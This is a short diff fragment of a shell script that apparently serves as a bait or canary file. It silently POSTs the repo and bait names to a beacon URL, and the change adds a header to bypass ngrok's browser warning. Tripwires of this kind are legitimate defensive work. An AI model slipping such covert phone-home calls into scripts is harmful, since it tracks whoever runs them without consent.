@@ -12,6 +12,7 @@ TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
 
 curl -s -X POST "${BEACON_URL}" \
   -H "Content-Type: application/json" \
+  -H "ngrok-skip-browser-warning: true" \
   -d "{
     \"repo\": \"devops-connect-toolkit\",
     \"bait\": \"connect_admin.sh\",
